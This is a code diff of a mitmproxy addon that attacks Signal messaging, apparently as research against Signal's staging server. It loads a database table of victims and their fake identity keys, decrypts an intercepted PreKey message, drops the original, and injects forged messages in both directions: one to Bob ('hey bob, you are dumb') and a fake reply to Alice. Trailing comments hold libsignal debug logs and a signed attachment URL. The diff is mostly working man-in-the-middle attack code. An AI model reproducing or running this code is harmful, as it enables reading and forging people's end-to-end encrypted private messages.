@@ -312,8 +312,10 @@ def websocket_message(flow: http.HTTPFlow):
     msg = b''
     once = False
     ctx.log(f"cont len {len(cont)}")
+
     # for messages in cont:
     messages = cont[-1]
+    ctx.log(f"websocket mess {messages}")
     if True:
         #ctx.log.warn(messages)
         ctx.log(messages.content)
@@ -326,6 +328,7 @@ def websocket_message(flow: http.HTTPFlow):
             proto_msg.ParseFromString(messages.content)
             ctx.log.alert(proto_msg)
             ctx.log.warn(f"diocane {proto_msg}")
+            ctx.log.warn(type(proto_msg.request.body))
             body = json.loads(proto_msg.request.body)
             #ctx.log.warn(body)
             
@@ -333,52 +336,68 @@ def websocket_message(flow: http.HTTPFlow):
             recv = body['destination']
             
             # check if protocol is available
-            type = body['messages'][0]['type'] #check out for creating instances of protocol
-            if (type == 3):
+            msg_type = body['messages'][0]['type'] #check out for creating instances of protocol
+            
+            if (msg_type == 3 and messages.injected == False):
+                messages.drop()
             ### try to x3dh if contact never seen before
                 #aliceToMitm = {}.fromkeys(["recv_IdenKey", "recv_SignedPreKey", "recv_PreKey", "recv_FakeIdenKey", "recv_FakeSignedPreKey", "recv_FakePreKey"])
                 aliceToMitmKeys = cur.execute(f"SELECT recv_IdenKey, recv_SignedPreKey, recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey FROM end2end WHERE recv_aci = ? AND deviceId = 1;", (recv,)).fetchone()
-                #print((aliceToMitmKeys))
+                ctx.log.warn((aliceToMitmKeys))
+                #ctx.log.warn((aliceToMitmKeys[0], aliceToMitmKeys[1], aliceToMitmKeys[2]['publicKey']))
             
-                mitmToALiceKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
+                mitmToBobKeys = cur.execute(f"SELECT aciIdenKey, aciSignedPreKey, aciPreKeys, aciFakeIdenKey, aciFakeSignedPreKey, aciFakePreKeys FROM victims WHERE aci = ?", (sourceUUid,)).fetchone() 
                 #ctx.log.warn(mitmToBobKeys)
                 #result = cur.execute(query, params).fetchall()
                 mitmAIK, mitmASPK, mitmOTK = json.loads(aliceToMitmKeys[3])["privateKey"], json.loads(aliceToMitmKeys[4])["privateKey"],json.loads(aliceToMitmKeys[5])
-                #ctx.log.error(f" porcodioooo{(base64.b64decode(mitmAIK).hex(), base64.b64decode(mitmASPK).hex(), base64.b64decode(mitmOTK[0]['privateKey']).hex())}")
-                mitmA = Bob(privIK = hex2PrivKey(base64.b64decode(mitmAIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmASPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmOTK[0]['privateKey']).hex()))
+                mitmBIK, mitmBSPK, mitmBOTK = json.loads(mitmToBobKeys[3])["privateKey"], json.loads(mitmToBobKeys[4])["privateKey"],json.loads(mitmToBobKeys[5])
+                bobIK, bobSPK, bobOTK = json.loads(aliceToMitmKeys[0]), json.loads(aliceToMitmKeys[1])["publicKey"],json.loads(aliceToMitmKeys[2])["publicKey"]
 
-                #ctx.log.error((mitmAIK, mitmOTK, mitmASPK))
+                mitmA = Bob(privIK = hex2PrivKey(base64.b64decode(mitmAIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmASPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmOTK[0]['privateKey']).hex()))
+                #mitmB = Alice(IK = hex2PrivKey(base64.b64decode(mitmBIK).hex()), privSPK = hex2PrivKey(base64.b64decode(mitmBSPK).hex()), privOPK = hex2PrivKey(base64.b64decode(mitmBOTK[0]['privateKey']).hex()))
+                mitmB = Alice(IK = hex2PrivKey(base64.b64decode(mitmBIK).hex()))
+
+                bob = Bob(pubIK = hex2PubKey(base64.b64decode(bobIK).hex()), pubSPK = hex2PubKey(base64.b64decode(bobSPK).hex()), pubOPK = hex2PubKey(base64.b64decode(bobOTK).hex()))
+                bob_bundle = KeyBundle(IK=bob.pubIK, SPK=bob.pubSPK, OPK=bob.pubOPK) ###check db, if they are the right keys
+                ctx.log.error((PubKey2Hex(bob_bundle.IK), PubKey2Hex(bob_bundle.SPK), PubKey2Hex(bob_bundle.OPK), PrivKey2Hex(mitmB.IK)))
+                
                 EncodedMessage = body['messages'][0]['content']
+                ctx.log.warn(f'Encoded Message {EncodedMessage}')
                 ctx.log.warn(EncodedMessage)
                 atm = AliceToMitm(bob = mitmA)
                 dec_msg = atm.BobReceive(EncodedMessage)
                 ctx.log.error(f"decrypted message {dec_msg}")
-                
+
                 ############# COMPLETE HERE Mitm send to Bob
-                # mitmB.x3dh(bob_bundle)
-                # bob.x3dh(mitmB_bundle)
-                # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
-                # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
-                print("")
+                #mitmB.x3dh(bob_bundle)
+                mitmToBob = MitmToBob(alice = mitmB, bob = bob)
+                mitmToBob.handshake(bob_bundle) ### check if handshake sk is the same
+                msg_to_bob = mitmToBob.AliceSendPreKeySignalMessage(b"hey bob, you are dumb", EncodedMessage) ### check correctness of the message
+                ctx.log.error(f"msg to bob {base64.b64encode(msg_to_bob).decode('ASCII')}")
+                pksmToBob = WebSocketMessage()
+
+                pksmToBob.CopyFrom(proto_msg)
+                pksmToBobBody = json.loads(pksmToBob.request.body)
+                pksmToBobBody['messages'] = [pksmToBobBody['messages'][0]]
+                pksmToBobBody['messages'][0]['content'] = base64.b64encode(msg_to_bob).decode('ASCII')
+                serialized = json.dumps(pksmToBobBody, separators=(',', ':'))
+                pksmToBob.request.body = bytes(serialized, 'utf-8')
+                wire_pksmToBob = pksmToBob.SerializeToString()
+                ctx.log.warn(f"to Bob {wire_pksmToBob.hex()}")
+                if not once:
+                    ctx.master.commands.call("inject.websocket",
+                                            flow,
+                                            False,
+                                            wire_pksmToBob,
+                                            False)
                     
-                msg = atm.BobSend(b"fuck you alice", b'bob profile key')
-                #\msg = base64.b64decode(msg)
+                    
+                #### BOB replies MITM         
+                    
+                msg = atm.BobSend(b"Thank you very much, I will take care!", b'bob profile key')
                 response = WebSocketMessage()
                 response.CopyFrom(proto_msg)
-                # response_body  = json.loads(response.request.body)
-                # response_body['destination'] = sourceUUid
-                # response_body['messages'][0]['type'] = 6
-                
-                
-                # response_body['messages'][0]['content'] = msg
-                # ctx.log.warn((response_body,msg))
-                
-                # response.request.body = bytes(json.dumps(response_body), 'utf-8')
-                # #response.request.body = json.dumps(response_body)
 
-                # #wire_response = response.SerializeToString()
-                # ctx.log.warn(f"response {response_body}")
-                # res = WebSocketRequestMessage()
                 response.request.verb = "PUT"
                 response.request.path = "/api/v1/message"
                 seed = current_milli_time()
@@ -407,25 +426,24 @@ def websocket_message(flow: http.HTTPFlow):
                 ctx.log.error(ack.response.id)
                 ack_wire = ack.SerializeToString()
                 last_message = flow.websocket.messages[-1]
-                if not once:
-                    ctx.master.commands.call("inject.websocket",
-                                            flow,
-                                            last_message.from_client,
-                                            ack_wire,
-                                            False)
-                
+                # if not once:
+                #     ctx.master.commands.call("inject.websocket",
+                #                             flow,
+                #                             last_message.from_client,
+                #                             ack_wire,
+                #                             False)
+                    
                 wire_response = response.SerializeToString()
-                ctx.log.warn(f"wire_response {wire_response}")
-                #ctx.log.warn(f"response {response}")
-                if not once:
-                    ctx.master.commands.call("inject.websocket",
-                                            flow,
-                                            last_message.from_client,
-                                            wire_response,
-                                            False)
-                    once = True
+                # ctx.log.warn(f"wire_response {wire_response}")
+                # if not once:
+                #     ctx.master.commands.call("inject.websocket",
+                #                         flow,
+                #                         last_message.from_client,
+                #                         wire_response,
+                #                         False)
+                once = True
                 
-            ## TODO: check if message is PrekeySignal or  SignalMessageq
+            ## TODO: check if message is PrekeySignal or  SignalMessage
             # atm = AliceToMitm(bob = mitmA)
             # dec_msg = atm.BobReceive(EncodedMessage)
             # print(dec_msg)
@@ -435,9 +453,22 @@ def websocket_message(flow: http.HTTPFlow):
             # bob.x3dh(mitmB_bundle)
             # mitmToBob = MitmToBob(alice = mitmB, bob = bob)
             # msg_to_bob = mitmToBob.AliceSendSignalMessage(b"hey bob, you are dumb")
-            
+                #messages.drop()
+
             
                 # other 
 #        cur.execute("CREATE TABLE end2end(v_aci, recv_aci, deviceId,recv_IdenKey, recv_SignedPreKey, \
 #            recv_PreKey, recv_FakeIdenKey, recv_FakeSignedPreKey, recv_FakePreKey, PRIMARY KEY (pNumber, aci, pni));")
 
+
+### Changes safety number ###
+### https://chat.staging.signal.org/v2/keys/signed?identity=pni catch this for new sessions
+### /v1/profile catch this for the profile key
+### 
+# 2023-09-04 22:51:06.392 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/protocol.rs:152: Bad Mac! Their Mac: 776083faf8d550bf Our Mac: fa5993da96ec897b
+# 2023-09-04 22:51:06.396 24005-24124 libsignal               org.thoughtcrime.securesms.staging   W  rust/protocol/src/session_cipher.rs:405: Failed to decrypt PreKey message with ratchet key: 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d and counter: 0. Session loaded for e7d71aea-c41a-4d88-856b-02e97998863a.1. Local session has base key: 33fa3a4a11f49b3111e2def201f4527b2b6c033b33b14fddd18b2e3fc5a75305 and counter: 0. invalid PreKey message: MAC verification failed
+# 2023-09-04 22:51:06.400 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:504: No valid session for recipient: e7d71aea-c41a-4d88-856b-02e97998863a.1, current session base key 4ab29c95fd3cc11faf7ede2bb273e4aff9e72fc6b7e110f44bde987a13da7b47, number of previous states: 0
+# 2023-09-04 22:51:06.402 24005-24124 libsignal               org.thoughtcrime.securesms.staging   E  rust/protocol/src/session_cipher.rs:518: Message from e7d71aea-c41a-4d88-856b-02e97998863a.1 failed to decrypt; sender ratchet public key 09f6eef69781beb8ce0aaa60af9ba39e44451f0ba62c4617fb7bfabe396bab4d message counter 0
+#  
+# https://cdn2-staging.signal.org/attachments/cwjOYfC-XhwG8HmY0XJb?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=signal-service-staging%40signal-cdn.iam.gserviceaccount.com%2F20230905%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20230905T084119Z&X-Goog-Expires=90000&X-Goog-SignedHeaders=host%3Bx-goog-content-length-range%3Bx-goog-resumable&X-Goog-Signature=8b23ebd65531f23ce136862d7bb39b9d55e66f0f4f39395c053a3e54fa2b28b943789db99d7d96314d8086ecaee332a6029293c9c563b7eb4db7816b438e52f44ba8b88ca4b2eb741cb9d766ac48fa0bbc735abf07d2a729cca91b5061924f550886b4519b967830cc6ab4ea1d2b292eec0b183919dadfb4fde2bbb5413844d30396d298f5a676785f15cb204cbc9229529b9f146b40566829f5bdb716a0c0c3dfae29443420bc91273544b36109db14a3e4f353402ab68bc5c8394478278655ac1fd1dfbfaf72eb9d0a01743b658f29b00b185b5f8e53aaaf0fd003023066bbe67edb0aeffdedfb3bd7fddc5d879fed64d3f7b007db10ef1615a930028fa914&upload_id=ADPycdsk95xDcH5Ho4Lf06FUdacc2bW81PeQxFkvesrAYg_ivZzYBi77sT5_a2OmnkVCsBHKKeR8x1VrtdwNRMbkWXd-beFXKmhG  
+# Candidate session 0 failed with 'invalid PreKey message: MAC verification failed', had 0 receiver chains
